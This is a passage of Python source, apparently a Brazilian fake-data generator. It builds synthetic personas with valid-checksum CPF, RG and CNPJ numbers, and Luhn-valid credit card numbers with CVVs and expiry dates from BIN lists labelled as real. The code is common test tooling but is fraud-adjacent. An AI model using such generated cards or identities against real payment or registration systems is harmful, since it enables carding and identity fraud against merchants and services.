            ("Canedo", 10), ("Capelo", 9), ("Cardozo", 8), ("Carmo", 7), ("Carrasco", 6),
            ("Carrilho", 5), ("Castanheira", 4), ("Castelo", 3), ("Castilho", 2), ("Catão", 1),
            ("Cavalcanti", 40), ("Cerqueira", 39), ("Cintra", 38), ("Coimbra", 37), ("Colombo", 36),
            ("Conceição", 35), ("Contreras", 34), ("Cortês", 33), ("Coutinho", 32), ("Crespo", 31),
            ("Dantas", 30), ("Delgado", 29), ("Dorneles", 28), ("Drummond", 27), ("Espírito Santo", 26),
            ("Estrela", 25), ("Evangelista", 24), ("Fal", 23), ("Falcão", 22), ("Fausto", 21),
            ("Félix", 20), ("Fernandez", 19), ("Figueira", 18), ("Figueiras", 17), ("Figueiroa", 16),
            ("Flores", 15), ("Fonseca", 14), ("Fortes", 13), ("França", 12), ("Frota", 11),
            ("Furtado", 10), ("Gallo", 9), ("Gamboa", 8), ("Garcia", 7), ("Gentil", 6),
            ("Gil", 5), ("Godoi", 4), ("Goulart", 3), ("Granja", 2), ("Grimaldi", 1)
        ]

        # Inserir dados no banco
        cursor_pessoas.executemany("INSERT OR IGNORE INTO nomes_masculinos (nome, frequencia) VALUES (?, ?)", nomes_masculinos)
        cursor_pessoas.executemany("INSERT OR IGNORE INTO nomes_femininos (nome, frequencia) VALUES (?, ?)", nomes_femininos)
        cursor_pessoas.executemany("INSERT OR IGNORE INTO sobrenomes (sobrenome, frequencia) VALUES (?, ?)", sobrenomes)

        # Endereços brasileiros por região
        enderecos = [
            # São Paulo
            ("Rua", "das Flores", "São Paulo", "SP", "01000", "Sudeste"),
            ("Avenida", "Paulista", "São Paulo", "SP", "01310", "Sudeste"),
            ("Rua", "Augusta", "São Paulo", "SP", "01305", "Sudeste"),
            ("Alameda", "Santos", "São Paulo", "SP", "01418", "Sudeste"),
            ("Rua", "Oscar Freire", "São Paulo", "SP", "01426", "Sudeste"),
            ("Avenida", "Faria Lima", "São Paulo", "SP", "04538", "Sudeste"),
            ("Rua", "dos Três Irmãos", "São Paulo", "SP", "05615", "Sudeste"),

            # Rio de Janeiro
            ("Avenida", "Copacabana", "Rio de Janeiro", "RJ", "22070", "Sudeste"),
            ("Rua", "Visconde de Pirajá", "Rio de Janeiro", "RJ", "22410", "Sudeste"),
            ("Avenida", "Atlântica", "Rio de Janeiro", "RJ", "22021", "Sudeste"),
            ("Rua", "Barão da Torre", "Rio de Janeiro", "RJ", "22411", "Sudeste"),
            ("Avenida", "Nossa Senhora de Copacabana", "Rio de Janeiro", "RJ", "22020", "Sudeste"),

            # Minas Gerais
            ("Rua", "da Bahia", "Belo Horizonte", "MG", "30160", "Sudeste"),
            ("Avenida", "Afonso Pena", "Belo Horizonte", "MG", "30130", "Sudeste"),
            ("Rua", "Rio de Janeiro", "Belo Horizonte", "MG", "30160", "Sudeste"),

            # Bahia
            ("Rua", "Chile", "Salvador", "BA", "40070", "Nordeste"),
            ("Avenida", "Sete de Setembro", "Salvador", "BA", "40060", "Nordeste"),
            ("Rua", "Carlos Gomes", "Salvador", "BA", "40070", "Nordeste"),

            # Rio Grande do Sul
            ("Rua", "dos Andradas", "Porto Alegre", "RS", "90020", "Sul"),
            ("Avenida", "Borges de Medeiros", "Porto Alegre", "RS", "90020", "Sul"),
            ("Rua", "Siqueira Campos", "Porto Alegre", "RS", "90050", "Sul"),

            # Paraná
            ("Rua", "XV de Novembro", "Curitiba", "PR", "80020", "Sul"),
            ("Avenida", "Marechal Deodoro", "Curitiba", "PR", "80010", "Sul"),
            ("Rua", "Barão do Rio Branco", "Curitiba", "PR", "80010", "Sul"),

            # Ceará
            ("Avenida", "Beira Mar", "Fortaleza", "CE", "60165", "Nordeste"),
            ("Rua", "José Vilar", "Fortaleza", "CE", "60175", "Nordeste"),
            ("Avenida", "Dom Luís", "Fortaleza", "CE", "60160", "Nordeste"),

            # Pernambuco
            ("Rua", "do Bom Jesus", "Recife", "PE", "50030", "Nordeste"),
            ("Avenida", "Boa Viagem", "Recife", "PE", "51020", "Nordeste"),
            ("Rua", "da Aurora", "Recife", "PE", "50050", "Nordeste"),

            # Goiás
            ("Avenida", "Goiás", "Goiânia", "GO", "74063", "Centro-Oeste"),
            ("Rua", "T-3", "Goiânia", "GO", "74123", "Centro-Oeste"),
            ("Avenida", "85", "Goiânia", "GO", "74083", "Centro-Oeste"),

            # Distrito Federal
            ("SQN", "203", "Brasília", "DF", "70834", "Centro-Oeste"),
            ("SQS", "116", "Brasília", "DF", "70385", "Centro-Oeste"),
            ("CLN", "102", "Brasília", "DF", "70722", "Centro-Oeste")
        ]

        cursor_pessoas.executemany("INSERT INTO enderecos (tipo_logradouro, nome_rua, cidade, estado, cep_base, regiao) VALUES (?, ?, ?, ?, ?, ?)", enderecos)

        # Características físicas por gênero
        caracteristicas_fisicas = [
            # Masculino: peso 60-120kg, altura 160-195cm
            (60, 120, 160, 195, "O+", "Castanhos", "Castanho", "M"),
            (65, 110, 165, 190, "A+", "Pretos", "Preto", "M"),
            (70, 100, 170, 185, "B+", "Verdes", "Loiro", "M"),
            (55, 95, 155, 180, "AB+", "Azuis", "Ruivo", "M"),
            (60, 105, 162, 188, "O-", "Castanhos", "Grisalho", "M"),
            
            # Feminino: peso 45-90kg, altura 150-180cm
            (45, 90, 150, 180, "O+", "Castanhos", "Castanho", "F"),
            (50, 85, 155, 175, "A+", "Pretos", "Preto", "F"),
            (48, 80, 152, 170, "B+", "Verdes", "Loiro", "F"),
            (52, 88, 158, 172, "AB+", "Azuis", "Ruivo", "F"),
            (47, 82, 153, 168, "O-", "Castanhos", "Grisalho", "F")
        ]

        # Profissões brasileiras realistas
        profissoes = [
            ("Desenvolvedor de Software", "Tecnologia", "Superior", 8500),
            ("Enfermeiro(a)", "Saúde", "Superior", 4200),
            ("Professor(a)", "Educação", "Superior", 3800),
            ("Vendedor(a)", "Comércio", "Médio", 2200),
            ("Administrador(a)", "Gestão", "Superior", 5500),
            ("Engenheiro(a)", "Engenharia", "Superior", 9200),
            ("Médico(a)", "Saúde", "Superior", 15000),
            ("Advogado(a)", "Jurídico", "Superior", 7800),
            ("Contador(a)", "Financeiro", "Superior", 4800),
            ("Designer Gráfico", "Criativo", "Superior", 3500),
            ("Motorista", "Transporte", "Fundamental", 2800),
            ("Cozinheiro(a)", "Alimentação", "Técnico", 2400),
            ("Recepcionista", "Administrativo", "Médio", 2000),
            ("Mecânico(a)", "Automotivo", "Técnico", 3200),
            ("Eletricista", "Técnico", "Técnico", 3800),
            ("Pedreiro", "Construção", "Fundamental", 2600),
            ("Jornalista", "Comunicação", "Superior", 4500),
            ("Psicólogo(a)", "Saúde", "Superior", 5200),
            ("Farmacêutico(a)", "Saúde", "Superior", 6800),
            ("Analista Financeiro", "Financeiro", "Superior", 7200),
            ("Gerente de Vendas", "Comércio", "Superior", 8800),
            ("Técnico em Informática", "Tecnologia", "Técnico", 3600),
            ("Auxiliar Administrativo", "Administrativo", "Médio", 2200),
            ("Operador de Caixa", "Comércio", "Médio", 1800),
            ("Segurança", "Segurança", "Médio", 2400),
            ("Dentista", "Saúde", "Superior", 8500),
            ("Fisioterapeuta", "Saúde", "Superior", 4800),
            ("Arquiteto(a)", "Construção", "Superior", 6500),
            ("Chef de Cozinha", "Alimentação", "Superior", 5500),
            ("Personal Trainer", "Esporte", "Superior", 4200),
            ("Tradutor(a)", "Linguística", "Superior", 4800),
            ("Veterinário(a)", "Saúde Animal", "Superior", 6200),
            ("Músico", "Arte", "Técnico", 3800),
            ("Fotógrafo(a)", "Arte", "Técnico", 3200),
            ("Barbeiro(a)", "Serviços", "Técnico", 2800),
            ("Manicure", "Beleza", "Técnico", 2200),
            ("Taxista", "Transporte", "Fundamental", 2600),
            ("Costureira", "Têxtil", "Técnico", 2400),
            ("Agricultor(a)", "Agropecuária", "Fundamental", 2000),
            ("Consultor(a)", "Consultoria", "Superior", 9500)
        ]

        cursor_pessoas.executemany("INSERT INTO caracteristicas_fisicas (peso_min, peso_max, altura_min, altura_max, tipo_sanguineo, cor_olhos, cor_cabelo, genero) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", caracteristicas_fisicas)
        cursor_pessoas.executemany("INSERT INTO profissoes (profissao, setor, escolaridade_minima, salario_medio) VALUES (?, ?, ?, ?)", profissoes)

        db_pessoas.commit()
        print("✅ Banco de dados populado com sucesso!")

    db_pessoas.close()

# Classes do sistema de geração completo
class DataGenerator:
    """Classe para gerar dados de teste completos - cartões, empresas, etc."""

    # BINs reais de cartões (primeiros 6 dígitos)
    BINS = {
        'Visa': [
            '404157', '414709', '424631', '438857', '451416', '457393', '493827', '411111', '424242', '450875',
            '400115', '400837', '401174', '402360', '403370', '404117', '404652', '405512', '406742', '407441',
            '408542', '410013', '410590', '411232', '412569', '413007', '414003', '414720', '415417', '416355',
            '417500', '418760', '419772', '420055', '421148', '422793', '423460', '424631', '425678', '426741',
            '427689', '428759', '429982', '430276', '431940', '432810', '433872', '434645', '435882', '436590',
            '437341', '438135', '439742', '440066', '441122', '442288', '443344', '444400', '445566', '446677'
        ],
        'Mastercard': [
            '512345', '515599', '522194', '527570', '535110', '540123', '554382', '555555', '512312', '526219',
            '510001', '510510', '511111', '512222', '513333', '514444', '515555', '516666', '517777', '518888',
            '519999', '520000', '521111', '522222', '523333', '524444', '525555', '526666', '527777', '528888',
            '529999', '530000', '531111', '532222', '533333', '534444', '535555', '536666', '537777', '538888'
        ],
        'Elo': [
            '431274', '438935', '451416', '457631', '457632', '504175', '627780', '636297', '636368', '651652',
            '651653', '651654', '651655', '651656', '651657', '651658', '651659', '651660', '651661', '651662'
        ],
        'Hipercard': [
            '606282', '637095', '637568', '637599', '637609', '637612', '637483', '637568', '637599', '637609'
        ],
        'American Express': [
            '340000', '341111', '342222', '343333', '344444', '345555', '346666', '347777', '348888', '349999',
            '370000', '371111', '372222', '373333', '374444', '375555', '376666', '377777', '378888', '379999'
        ]
    }

    @staticmethod
    def calcular_luhn(numero):
        """Calcula o dígito verificador usando algoritmo de Luhn"""
        def luhn_soma(num_str):
            soma = 0
            alternado = False
            for i in reversed(range(len(num_str))):
                n = int(num_str[i])
                if alternado:
                    n *= 2
                    if n > 9:
                        n = (n % 10) + 1
                soma += n
                alternado = not alternado
            return soma

        check_sum = luhn_soma(numero)
        return (10 - (check_sum % 10)) % 10

    @classmethod
    def gerar_cartao(cls, bandeira='random'):
        """Gera um cartão de crédito válido"""
        if bandeira == 'random':
            bandeira = random.choice(list(cls.BINS.keys()))

        if bandeira not in cls.BINS:
            bandeira = 'Visa'  # Fallback

        bin_numero = random.choice(cls.BINS[bandeira])

        # Gerar resto do número
        if bandeira == 'American Express':
            # Amex tem 15 dígitos
            resto = ''.join([str(random.randint(0, 9)) for _ in range(8)])
            numero_sem_check = bin_numero + resto
        else:
            # Outros têm 16 dígitos
            resto = ''.join([str(random.randint(0, 9)) for _ in range(9)])
            numero_sem_check = bin_numero + resto

        # Calcular dígito verificador
        check_digit = cls.calcular_luhn(numero_sem_check)
        numero_completo = numero_sem_check + str(check_digit)

        # Gerar CVV
        cvv_length = 4 if bandeira == 'American Express' else 3
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])

        # Gerar data de validade (1-5 anos no futuro)
        hoje = datetime.now()
        anos_futuros = random.randint(1, 5)
        mes_expiracao = random.randint(1, 12)
        ano_expiracao = hoje.year + anos_futuros

        # Formatação do número do cartão
        if bandeira == 'American Express':
            numero_formatado = f"{numero_completo[:4]} {numero_completo[4:10]} {numero_completo[10:]}"
        else:
            numero_formatado = f"{numero_completo[:4]} {numero_completo[4:8]} {numero_completo[8:12]} {numero_completo[12:]}"

        return {
            'numero': numero_formatado,
            'numero_limpo': numero_completo,
            'bandeira': bandeira,
            'cvv': cvv,
            'validade': f"{mes_expiracao:02d}/{str(ano_expiracao)[2:]}",
            'mes': mes_expiracao,
            'ano': ano_expiracao
        }

    @staticmethod
    def validar_cartao(numero):
        """Valida um cartão usando algoritmo de Luhn"""
        numero = re.sub(r'[\s-]', '', numero)
        if not numero.isdigit():
            return False

        def luhn_check(num):
            soma = 0
            alternado = False
            for i in reversed(range(len(num))):
                n = int(num[i])
                if alternado:
                    n *= 2
                    if n > 9:
                        n = (n % 10) + 1
                soma += n
                alternado = not alternado
            return soma % 10 == 0

        return luhn_check(numero)

    @staticmethod
    def gerar_cnpj_valido():
        """Gera um CNPJ válido usando algoritmo da Receita Federal"""
        # Gerar os 8 primeiros dígitos
        cnpj = [random.randint(0, 9) for _ in range(8)]
        cnpj.extend([0, 0, 0, 1])  # Filial 0001

        # Calcular primeiro dígito verificador
        sequencia1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2]
        soma = sum(cnpj[i] * sequencia1[i] for i in range(12))
        resto = soma % 11
        digito1 = 0 if resto < 2 else 11 - resto
        cnpj.append(digito1)

        # Calcular segundo dígito verificador
        sequencia2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2]
        soma = sum(cnpj[i] * sequencia2[i] for i in range(13))
        resto = soma % 11
        digito2 = 0 if resto < 2 else 11 - resto
        cnpj.append(digito2)

        cnpj_str = ''.join(map(str, cnpj))
        return f"{cnpj_str[:2]}.{cnpj_str[2:5]}.{cnpj_str[5:8]}/{cnpj_str[8:12]}-{cnpj_str[12:]}"

    @staticmethod
    def validar_cpf(cpf):
        """Valida um CPF usando algoritmo da Receita Federal"""
        cpf = re.sub(r'[^0-9]', '', cpf)

        if len(cpf) != 11 or cpf == cpf[0] * 11:
            return False

        # Primeiro dígito verificador
        soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
        resto = soma % 11
        digito1 = 0 if resto < 2 else 11 - resto

        if int(cpf[9]) != digito1:
            return False

        # Segundo dígito verificador
        soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
        resto = soma % 11
        digito2 = 0 if resto < 2 else 11 - resto

        return int(cpf[10]) == digito2

    @staticmethod
    def validar_cnpj(cnpj):
        """Valida um CNPJ usando algoritmo da Receita Federal"""
        cnpj = re.sub(r'[^0-9]', '', cnpj)

        if len(cnpj) != 14 or cnpj == cnpj[0] * 14:
            return False

        # Primeiro dígito verificador
        sequencia1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2]
        soma = sum(int(cnpj[i]) * sequencia1[i] for i in range(12))
        resto = soma % 11
        digito1 = 0 if resto < 2 else 11 - resto

        if int(cnpj[12]) != digito1:
            return False

        # Segundo dígito verificador  
        sequencia2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2]
        soma = sum(int(cnpj[i]) * sequencia2[i] for i in range(13))
        resto = soma % 11
        digito2 = 0 if resto < 2 else 11 - resto

        return int(cnpj[13]) == digito2

    @staticmethod
    def gerar_empresa_fake():
        """Gera dados de empresa fake brasileira"""
        tipos_empresa = [
            "LTDA", "EIRELI", "S.A.", "ME", "EPP", "Comércio", "Serviços", 
            "Indústria", "Tecnologia", "Consultoria", "Marketing"
        ]

        nomes_fantasia = [
            "Tech Solutions", "Digital Systems", "Smart Business", "Global Services",
            "Innovation Hub", "Dynamic Solutions", "Prime Technology", "Advanced Systems",
            "Elite Services", "Superior Tech", "NextGen Solutions", "ProTech Systems",
            "Mega Corporation", "Ultra Services", "Super Tech", "Master Solutions",
            "Alpha Systems", "Beta Technologies", "Gamma Services", "Delta Corp",
            "Fast Solutions", "Quick Services", "Rapid Tech", "Speed Systems",
            "Nova Solutions", "Star Technologies", "Luna Services", "Solar Corp"
        ]

        # Gerar CNPJ válido
        cnpj = DataGenerator.gerar_cnpj_valido()

        # Nome fantasia
        tipo = random.choice(tipos_empresa)
        nome_base = random.choice(nomes_fantasia)
        razao_social = f"{nome_base} {tipo}"

        # Inscrição Estadual (formato simplificado)
        ie = f"{random.randint(100000000, 999999999)}"

        # Capital social
        capital_values = [10000, 25000, 50000, 100000, 250000, 500000, 1000000]
        capital_social = random.choice(capital_values)

        # Atividade (CNAE simplificado)
        atividades = [
            "6201-5/00 - Desenvolvimento de programas de computador sob encomenda",
            "6202-3/00 - Desenvolvimento e licenciamento de programas de computador customizáveis",
            "6203-1/00 - Desenvolvimento e licenciamento de programas de computador não-customizáveis",
            "7020-4/00 - Atividades de consultoria em gestão empresarial",
            "7319-0/02 - Promoção de vendas",
            "4791-2/00 - Comércio varejista de mercadorias por correspondência ou internet",
            "8230-0/01 - Serviços de organização de feiras, congressos, exposições e festas",
            "6311-9/00 - Tratamento de dados, provedores de serviços de aplicação e serviços de hospedagem"
        ]

        # Data de abertura (1-10 anos atrás)
        anos_atras = random.randint(1, 10)
        data_abertura = datetime.now() - timedelta(days=anos_atras * 365 + random.randint(0, 365))

        # Situação da empresa
        situacoes = ["ATIVA", "ATIVA", "ATIVA", "ATIVA", "SUSPENSA", "BAIXADA"]
        situacao = random.choice(situacoes)

        return {
            'razao_social': razao_social,
            'nome_fantasia': nome_base,
            'cnpj': cnpj,
            'inscricao_estadual': ie,
            'situacao': situacao,
            'data_abertura': data_abertura.strftime("%d/%m/%Y"),
            'capital_social': f"R$ {capital_social:,.2f}".replace(',', '.'),
            'atividade_principal': random.choice(atividades),
            'tipo': tipo,
            'porte': random.choice(["ME", "EPP", "DEMAIS"]),
            'natureza_juridica': "206-2 - Sociedade Empresária Limitada" if tipo == "LTDA" else "213-5 - Empresa Individual de Responsabilidade Limitada"
        }

# Função para gerar CPF válido
def gerar_cpf_valido():
    """Gera um CPF válido usando algoritmo oficial"""
    # Gerar os 9 primeiros dígitos
    cpf = [random.randint(0, 9) for _ in range(9)]

    # Calcular primeiro dígito verificador
    soma = sum(cpf[i] * (10 - i) for i in range(9))
    resto = soma % 11
    digito1 = 0 if resto < 2 else 11 - resto
    cpf.append(digito1)

    # Calcular segundo dígito verificador
    soma = sum(cpf[i] * (11 - i) for i in range(10))
    resto = soma % 11
    digito2 = 0 if resto < 2 else 11 - resto
    cpf.append(digito2)

    cpf_str = ''.join(map(str, cpf))
    return f"{cpf_str[:3]}.{cpf_str[3:6]}.{cpf_str[6:9]}-{cpf_str[9:]}"

# Função para gerar RG válido
def gerar_rg_valido():
    """Gera um RG válido por estado"""
    estados_rg = {
        "SP": {"inicio": 10, "fim": 99},
        "RJ": {"inicio": 10, "fim": 30},
        "MG": {"inicio": 10, "fim": 30},
        "RS": {"inicio": 10, "fim": 30},
        "PR": {"inicio": 10, "fim": 30},
        "BA": {"inicio": 10, "fim": 30},
        "CE": {"inicio": 10, "fim": 30},
        "PE": {"inicio": 10, "fim": 30},
        "GO": {"inicio": 10, "fim": 30},
        "DF": {"inicio": 10, "fim": 30}
    }

    estado = random.choice(list(estados_rg.keys()))
    inicio = estados_rg[estado]["inicio"]
    fim = estados_rg[estado]["fim"]

    # Gerar 9 dígitos para RG
    numero = f"{random.randint(inicio, fim):02d}{random.randint(100000, 999999)}{random.randint(0, 9)}"
    return f"{numero[:2]}.{numero[2:5]}.{numero[5:8]}-{numero[8]}"

# Função avançada para gerar pessoa fake
def generate_fake_person_advanced():
    """Gera dados de pessoa fake usando o banco de dados"""
    try:
        db_pessoas = sqlite3.connect("database/pessoas.db")
        cursor_pessoas = db_pessoas.cursor()

        # Escolher gênero aleatoriamente
        genero = random.choice(["M", "F"])

        # Buscar nome baseado na frequência (nomes mais comuns têm maior chance)
        if genero == "M":
            cursor_pessoas.execute("SELECT nome FROM nomes_masculinos ORDER BY RANDOM() * frequencia DESC LIMIT 1")
            nome = cursor_pessoas.fetchone()[0]
        else:
            cursor_pessoas.execute("SELECT nome FROM nomes_femininos ORDER BY RANDOM() * frequencia DESC LIMIT 1")
            nome = cursor_pessoas.fetchone()[0]

        # Buscar sobrenome baseado na frequência
        cursor_pessoas.execute("SELECT sobrenome FROM sobrenomes ORDER BY RANDOM() * frequencia DESC LIMIT 1")
        sobrenome = cursor_pessoas.fetchone()[0]

        # Buscar endereço
        cursor_pessoas.execute("SELECT * FROM enderecos ORDER BY RANDOM() LIMIT 1")
        endereco_data = cursor_pessoas.fetchone()

        # Buscar características físicas baseadas no gênero
        cursor_pessoas.execute("SELECT * FROM caracteristicas_fisicas WHERE genero = ? ORDER BY RANDOM() LIMIT 1", (genero,))
        caracteristicas = cursor_pessoas.fetchone()

        # Buscar profissão
        cursor_pessoas.execute("SELECT * FROM profissoes ORDER BY RANDOM() LIMIT 1")
        profissao_data = cursor_pessoas.fetchone()

        db_pessoas.close()

        nome_completo = f"{nome} {sobrenome}"

        # Gerar características físicas
        if caracteristicas:
            peso = random.randint(caracteristicas[1], caracteristicas[2])  # peso_min, peso_max
            altura = random.randint(caracteristicas[3], caracteristicas[4])  # altura_min, altura_max
            tipo_sanguineo = caracteristicas[5]
            cor_olhos = caracteristicas[6] 
            cor_cabelo = caracteristicas[7]
        else:
            # Fallback se não houver dados
            if genero == "M":
                peso = random.randint(60, 120)
                altura = random.randint(160, 195)
            else:
                peso = random.randint(45, 90)
                altura = random.randint(150, 180)
            tipo_sanguineo = random.choice(["O+", "O-", "A+", "A-", "B+", "B-", "AB+", "AB-"])
            cor_olhos = random.choice(["Castanhos", "Pretos", "Verdes", "Azuis", "Mel"])
            cor_cabelo = random.choice(["Castanho", "Preto", "Loiro", "Ruivo", "Grisalho"])

        # Gerar profissão e renda
        if profissao_data:
            profissao = profissao_data[1]
            setor = profissao_data[2]
            escolaridade = profissao_data[3]
            salario_base = profissao_data[4]
            # Variar salário em ±30%
            variacao = random.uniform(0.7, 1.3)
            salario = int(salario_base * variacao)
        else:
            profissao = "Autônomo(a)"
            setor = "Diversos"
            escolaridade = "Médio"
            salario = random.randint(2000, 8000)

        # Gerar data de nascimento (18 a 80 anos)
        from datetime import timedelta
        hoje = datetime.now()
        idade_min = 18
        idade_max = 80

        anos_atras = random.randint(idade_min, idade_max)
        data_nascimento = hoje - timedelta(days=anos_atras * 365 + random.randint(0, 365))

        # Gerar telefone brasileiro válido
        ddds_validos = [11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 24, 27, 28, 31, 32, 33, 34, 35, 37, 38, 
                       41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 55, 61, 62, 63, 64, 65, 66, 67, 68, 
                       69, 71, 73, 74, 75, 77, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99]

        ddd = random.choice(ddds_validos)
        # Celular (9 dígitos) mais comum hoje em dia
        if random.choice([True, True, True, False]):  # 75% celular
            numero = f"9{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
        else:  # 25% fixo
            numero = f"{random.randint(2000, 9999)}{random.randint(1000, 9999)}"

        telefone = f"({ddd:02d}) {numero[:5]}-{numero[5:]}"

        # Gerar email baseado no nome
        dominios_brasileiros = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "uol.com.br", 
                              "terra.com.br", "ig.com.br", "bol.com.br", "r7.com", "globo.com"]

        nome_email = nome.lower().replace(" ", "")
        sobrenome_email = sobrenome.lower().replace(" ", "")

        # Remover acentos do email
        acentos = {
            'á': 'a', 'à': 'a', 'ã': 'a', 'â': 'a', 'ä': 'a',
            'é': 'e', 'è': 'e', 'ê': 'e', 'ë': 'e',
            'í': 'i', 'ì': 'i', 'î': 'i', 'ï': 'i',
            'ó': 'o', 'ò': 'o', 'õ': 'o', 'ô': 'o', 'ö': 'o',
            'ú': 'u', 'ù': 'u', 'û': 'u', 'ü': 'u',
            'ç': 'c', 'ñ': 'n'
        }

        for acento, letra in acentos.items():
            nome_email = nome_email.replace(acento, letra)
            sobrenome_email = sobrenome_email.replace(acento, letra)

        patterns_email = [
            f"{nome_email}.{sobrenome_email}@{random.choice(dominios_brasileiros)}",
            f"{nome_email}{sobrenome_email}@{random.choice(dominios_brasileiros)}",
            f"{nome_email}.{sobrenome_email}{random.randint(1, 999)}@{random.choice(dominios_brasileiros)}",
            f"{nome_email}{random.randint(1, 9999)}@{random.choice(dominios_brasileiros)}",
            f"{nome_email[0]}{sobrenome_email}@{random.choice(dominios_brasileiros)}"
        ]

        email = random.choice(patterns_email)

        # Montar endereço completo
        if endereco_data:
            id_endereco, tipo_log, nome_rua, cidade, estado, cep_base, regiao = endereco_data
            numero_casa = random.randint(1, 9999)
            endereco_completo = f"{tipo_log} {nome_rua}, {numero_casa}"

            # Gerar CEP baseado na cidade
            cep_num = int(cep_base) + random.randint(0, 999)
            cep = f"{cep_num:05d}-{random.randint(100, 999):03d}"
        else:
            # Fallback se não houver dados no banco
            endereco_completo = "Rua das Flores, 123"
            cidade = "São Paulo"
            estado = "SP"
            cep = f"{random.randint(10000, 99999):05d}-{random.randint(100, 999):03d}"

        # Calcular idade baseada na data de nascimento
        hoje = datetime.now()
        idade = hoje.year - data_nascimento.year - ((hoje.month, hoje.day) < (data_nascimento.month, data_nascimento.day))

        return {
            "nome": nome_completo,
            "genero": "Masculino" if genero == "M" else "Feminino",
            "data_nascimento": data_nascimento.strftime("%d/%m/%Y"),
            "idade": idade,
            "cpf": gerar_cpf_valido(),
            "rg": gerar_rg_valido(),
            "telefone": telefone,
            "email": email,
            "endereco": endereco_completo,
            "cidade": cidade,
            "estado": estado,
            "cep": cep,
            "nacionalidade": "Brasileira",
            # Novos dados físicos
            "peso": f"{peso}kg",
            "altura": f"{altura/100:.2f}m",
            "tipo_sanguineo": tipo_sanguineo,
            "cor_olhos": cor_olhos,
            "cor_cabelo": cor_cabelo,
            # Dados profissionais
            "profissao": profissao,
            "setor": setor,
            "escolaridade": escolaridade,
            "salario": f"R$ {salario:,.2f}".replace(',', '.')
        }

    except Exception as e:
        print(f"❌ Erro ao gerar pessoa: {e}")
        # Fallback para o método anterior se der erro
        return generate_fake_person_br()

def generate_fake_person_br():
    """Gera dados de pessoa fake brasileira (método original como fallback)"""
    import random
    from datetime import datetime, timedelta

    nomes_masculinos = ["João", "Pedro", "Lucas", "Matheus", "Carlos", "José", "Francisco", "Gabriel", "Rafael", "Daniel", 
                       "Bruno", "Felipe", "André", "Ricardo", "Marcos", "Paulo", "Rodrigo", "Diego", "Leonardo", "Gustavo"]

    nomes_femininos = ["Maria", "Ana", "Beatriz", "Julia", "Camila", "Larissa", "Fernanda", "Amanda", "Gabriela", "Leticia",
                      "Carla", "Patricia", "Sandra", "Mariana", "Isabella", "Sofia", "Rafaela", "Bruna", "Vanessa", "Priscila"]

    sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes",
                 "Costa", "Ribeiro", "Martins", "Carvalho", "Rocha", "Barbosa", "Pinto", "Moreira", "Cunha", "Araújo"]

    # Escolher gênero aleatoriamente
    genero = random.choice(["M", "F"])
    if genero == "M":
        nome = random.choice(nomes_masculinos)
    else:
        nome = random.choice(nomes_femininos)

    sobrenome = random.choice(sobrenomes)
    nome_completo = f"{nome} {sobrenome}"

    # Gerar data de nascimento (18 a 80 anos)
    def gerar_data_nascimento():
        hoje = datetime.now()
        idade_min = 18
        idade_max = 80

        anos_atras = random.randint(idade_min, idade_max)
        data_nascimento = hoje - timedelta(days=anos_atras * 365)

        return data_nascimento.strftime("%d/%m/%Y")

    # Gerar telefone brasileiro
    def gerar_telefone():
        # DDDs válidos do Brasil
        ddds = [11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 24, 27, 28, 31, 32, 33, 34, 35, 37, 38, 
                41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 55, 61, 62, 63, 64, 65, 66, 67, 68, 
                69, 71, 73, 74, 75, 77, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99]

        ddd = random.choice(ddds)
        # Celular (9 dígitos) ou fixo (8 dígitos)
        if random.choice([True, False]):  # Celular
            numero = f"9{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
        else:  # Fixo
            numero = f"{random.randint(2000, 9999)}{random.randint(1000, 9999)}"

        return f"({ddd:02d}) {numero[:4]}-{numero[4:]}"

    # Gerar endereço brasileiro
    def gerar_endereco():
        tipos_logradouro = ["Rua", "Avenida", "Travessa", "Alameda", "Praça", "Estrada"]
        nomes_rua = ["das Flores", "do Sol", "da Paz", "Central", "Principal", "São João", "das Acácias", 
                    "dos Pinheiros", "da Liberdade", "do Comércio", "XV de Novembro", "Getúlio Vargas",
                    "Dom Pedro II", "Tiradentes", "José de Alencar", "Castro Alves"]

        tipo = random.choice(tipos_logradouro)
        nome = random.choice(nomes_rua)
        numero = random.randint(1, 9999)

        return f"{tipo} {nome}, {numero}"

    # Estados e cidades brasileiras
    estados_cidades = {
        "SP": ["São Paulo", "Campinas", "Santos", "São Bernardo do Campo", "Guarulhos", "Osasco", "Ribeirão Preto"],
        "RJ": ["Rio de Janeiro", "Niterói", "Nova Iguaçu", "Duque de Caxias", "São Gonçalo", "Volta Redonda"],
        "MG": ["Belo Horizonte", "Uberlândia", "Contagem", "Juiz de Fora", "Betim", "Montes Claros"],
        "RS": ["Porto Alegre", "Caxias do Sul", "Pelotas", "Canoas", "Santa Maria", "Gravataí"],
        "PR": ["Curitiba", "Londrina", "Maringá", "Ponta Grossa", "Cascavel", "São José dos Pinhais"],
        "SC": ["Florianópolis", "Joinville", "Blumenau", "São José", "Criciúma", "Chapecó"],
        "BA": ["Salvador", "Feira de Santana", "Vitória da Conquista", "Camaçari", "Juazeiro", "Ilhéus"],
        "GO": ["Goiânia", "Aparecida de Goiânia", "Anápolis", "Rio Verde", "Luziânia", "Águas Lindas"],
        "PE": ["Recife", "Jaboatão dos Guararapes", "Olinda", "Caruaru", "Petrolina", "Paulista"],
        "CE": ["Fortaleza", "Caucaia", "Juazeiro do Norte", "Maracanaú", "Sobral", "Crato"]
    }

